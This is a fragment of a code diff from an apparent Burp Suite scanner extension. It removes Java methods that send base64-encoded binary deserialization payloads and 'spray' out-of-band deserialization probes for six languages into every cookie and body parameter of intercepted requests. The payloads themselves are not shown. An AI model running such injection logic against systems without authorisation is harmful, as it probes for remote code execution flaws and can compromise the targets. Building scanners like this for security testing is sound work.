-    private void sendBinaryOobPayload(HttpRequestResponse original, DeserPoint dp, String url,
-                                       byte[] binaryPayload, String technique) throws InterruptedException {
-        if (binaryPayload == null || binaryPayload.length == 0) return;
-
-        AtomicReference<HttpRequestResponse> sentRequest = new AtomicReference<>();
-        // No separate collab needed — URL is already embedded in the binary
-        String base64Payload = Base64.getEncoder().encodeToString(binaryPayload);
-
-        // Send base64 (primary — most deser expects base64)
-        HttpRequestResponse result = sendPayload(original, dp, base64Payload);
-        sentRequest.set(result);
-        perHostDelay();
-
-        // Also try URL-encoded base64
-        sendPayload(original, dp, URLEncoder.encode(base64Payload, StandardCharsets.UTF_8));
-        perHostDelay();
     }
 
     // ==================== HELPERS ====================
@@ -3060,85 +2762,6 @@ public class DeserializationScanner implements ScanModule {
 
     // ==================== BLIND OOB SPRAY ====================
 
-    private static final String[] ALL_DESER_LANGUAGES = {"Java", "PHP", ".NET", "Python", "Ruby", "Node.js"};
-
-    /**
-     * Blind OOB spray: when passive detection finds NO deserialization points,
-     * spray OOB payloads for ALL languages into every cookie and body parameter.
-     * OOB-only via Collaborator — no timing tests, no error-based tests.
-     */
-    private void blindOobSpray(HttpRequestResponse original, String urlPath) throws InterruptedException {
-        if (collaboratorManager == null || !collaboratorManager.isAvailable()) return;
-
-        HttpRequest request = original.request();
-        String url = request.url();
-        List<DeserPoint> blindPoints = collectBlindPoints(request);
-
-        if (blindPoints.isEmpty()) return;
-        api.logging().logToOutput("[Deser] No deserialization detected passively — blind OOB spray on "
-                + blindPoints.size() + " injection points: " + url);
-
-        fireBlindOob(original, url, urlPath, blindPoints);
-    }
-
-    /**
-     * Blind OOB spray filtered to a single parameter name.
-     */
-    private void blindOobSprayForParameter(HttpRequestResponse original, String urlPath,
-                                            String targetParam) throws InterruptedException {
-        if (collaboratorManager == null || !collaboratorManager.isAvailable()) return;
-
-        HttpRequest request = original.request();
-        String url = request.url();
-        List<DeserPoint> blindPoints = collectBlindPoints(request);
-        blindPoints.removeIf(dp -> !dp.name.equalsIgnoreCase(targetParam));
-
-        if (blindPoints.isEmpty()) return;
-        api.logging().logToOutput("[Deser] No deserialization detected passively — blind OOB spray on param '"
-                + targetParam + "': " + url);
-
-        fireBlindOob(original, url, urlPath, blindPoints);
-    }
-
-    /**
-     * Collects all cookies and body parameters as blind DeserPoints, one per language.
-     */
-    private List<DeserPoint> collectBlindPoints(HttpRequest request) {
-        List<DeserPoint> points = new ArrayList<>();
-        for (var param : request.parameters()) {
-            if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.COOKIE) {
-                for (String lang : ALL_DESER_LANGUAGES) {
-                    points.add(new DeserPoint("cookie", param.name(), param.value(), lang, "blind OOB spray"));
-                }
-            } else if (param.type() == burp.api.montoya.http.message.params.HttpParameterType.BODY) {
-                for (String lang : ALL_DESER_LANGUAGES) {
-                    points.add(new DeserPoint("body_param", param.name(), param.value(), lang, "blind OOB spray"));
-                }
-            }
-        }
-        return points;
-    }
-
-    /**
-     * Fires OOB-only active testing for each blind DeserPoint. Deduplicates by
-     * param+language so repeated requests to the same endpoint don't re-spray.
-     */
-    private void fireBlindOob(HttpRequestResponse original, String url, String urlPath,
-                               List<DeserPoint> blindPoints) throws InterruptedException {
-        for (DeserPoint dp : blindPoints) {
-            String dedupKey = dp.name + ":" + dp.language + ":blind";
-            if (!dedup.markIfNew("deser-scanner", urlPath, dedupKey)) continue;
-
-            try {
-                activeTestOob(original, dp, url);
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                return;
-            } catch (Exception e) {
-                api.logging().logToError("Deser blind OOB error (" + dp.language + " " + dp.name + "): " + e.getMessage());
-            }
-        }
-    }
 
     @Override
     public void destroy() { tested.clear(); }
